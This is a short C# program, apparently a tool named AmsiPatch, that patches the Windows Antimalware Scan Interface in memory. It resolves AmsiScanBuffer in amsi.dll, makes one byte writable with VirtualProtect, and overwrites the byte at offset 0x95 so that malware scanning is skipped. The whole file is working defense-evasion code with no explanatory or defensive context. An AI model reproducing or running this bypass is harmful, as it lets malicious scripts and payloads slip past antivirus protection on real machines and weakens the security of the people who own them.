using System;
using System.Runtime.InteropServices;
using System.Threading;


namespace AmsiPatch
{
    internal class Program
    {

        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string name);

        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UInt32 dwSize, uint flNewProtect, out uint lpflOldProtect);

        static void Main(string[] args)
        {
            // offset 0x83 => 0x74
            // offset 0x95 => 0x75

            IntPtr lib = LoadLibrary("amsi.dll");
            IntPtr amsi = GetProcAddress(lib, "AmsiScanBuffer");
            IntPtr final = IntPtr.Add(amsi, 0x95);
            uint old = 0;
            
            VirtualProtect(final, (UInt32)0x1, 0x40, out old);

            Console.WriteLine(old);
            byte[] patch = new byte[] { 0x75 };
            Marshal.Copy(patch, 0, final, 1);
            
            VirtualProtect(final, (UInt32)0x1, old, out old);
        }
    }
}
